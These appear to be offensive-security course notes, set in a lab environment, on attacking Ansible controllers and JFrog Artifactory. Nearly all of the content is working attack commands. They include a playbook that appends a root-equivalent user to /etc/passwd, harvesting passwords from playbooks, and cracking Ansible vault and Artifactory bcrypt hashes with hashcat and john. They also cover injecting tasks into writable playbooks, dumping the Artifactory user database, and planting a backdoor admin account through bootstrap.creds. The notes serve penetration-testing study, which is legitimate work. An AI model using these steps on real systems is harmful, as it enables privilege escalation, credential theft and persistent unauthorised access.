#We can find the host inventory on the controller at /etc/ansible/hosts
offsec@controller:~$ cat /etc/ansible/hosts

#Enumerating Ansible
offsec@controller:~$ ansible
offsec@controller:~$ grep ansible /etc/passwd
offsec@controller:~$ grep ansible /var/log/syslog 

#Ad-hoc Commands
//here victims is a group of hosts
offsec@controller:~$ ansible victims -a "whoami"

//run as root
offsec@controller:~$ ansible victims -a "whoami" --become
//run as another user
offsec@controller:~$ ansible victims -a "whoami" --become anotheruser

#Ansible Playbooks
//create a file called /opt/playbooks/getinfo.yml with following content

---
- name: Get system info
hosts: all
gather_facts: true
tasks:
- name: Display info
debug:
msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"

#Abuse ansible (reverse shell over playbook)
---
- name: Run shell command as root
  hosts: localhost
  become: yes
  tasks:
    - name: Execute shell command as root
      shell: echo 'root2:mwIYDnuCYwIZw:0:0:root:/root:/bin/bash' >> /etc/passwd

ansibleadm@controller:/opt/playbooks$ ansible-playbook getinfo.yml

#Haverst credentials
grep  pass /opt/playbook/*.yml

#Decrypt vault pass
python3 /usr/share/john/ansible2john.py ./test.yml
hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt

//Next decode the file with ansible-vault decrypt
cat vault_passwd_file.txt | ansible-vault decrypt  

#Weak Permissions on Ansible Playbooks
find /opt/playbooks -type f -writable

//Next we can rewrite add the following task (and add become: yes at the beginning)
- name: Run command
shell: touch /tmp/mycreatedfile.txt
async: 10
poll: 0

#Sensitive Data Leakage via Ansible Modules
offsec@linuxvictim:~$ grep ansible-command /var/log/syslog


#Introduction to Artifactory
offsec@controller:/opt/jfrog$ sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
//We can access the login page at http://controller:8082/

#Artifactory Enumeration
ps aux | grep artifactory

#Compromising Artifactory Backups
root@controller:/opt/jfrog/artifactory/var/data/artifactory/filestore/37# ls -al

//read user password (in bcrypt) and crack them
root@controller:/opt/jfrog/artifactory/var/backup/access# cat access.backup.20200730120454.json
kali@kali:~$ sudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt

//or this method 
//the database containing the user information is located at /opt/jfrog/artifactory/var/data/access/derby.

offsec@controller:~$ mkdir /tmp/hackeddb
offsec@controller:~$ sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb
offsec@controller:~$ sudo chmod 755 /tmp/hackeddb/derby
offsec@controller:~$ sudo rm /tmp/hackeddb/derby/*.lck

offsec@controller:~$ sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
ij version 10.15
ij> connect 'jdbc:derby:/tmp/hackeddb/derby';
ij>select * from access_users;

#Adding a Secondary Artifactory Admin Account
This method requires write access to the /opt/jfrog/artifactory/var/etc/access folder and the ability to change permissions on the newly-created file, which usually requires root or sudo access.

//Create a file bootstrap.creds in /opt/jfrog/artifactory/var/etc/access with the following content
haxmin@*=haxhaxhax 
//(username haxmin, password haxhaxhax)
offsec@controller:/opt/jfrog$ sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds

offsec@controller:/opt/jfrog$ sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop
offsec@controller:/opt/jfrog$ sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start

//During the restart stage, Artifactory will load our bootstrap credential file and process the new
//user. We can verify this by examining the /opt/jfrog/artifactory/var/log/console.log

offsec@controller:~$ sudo grep "Create admin user" /opt/jfrog/artifactory/var/log/console.log
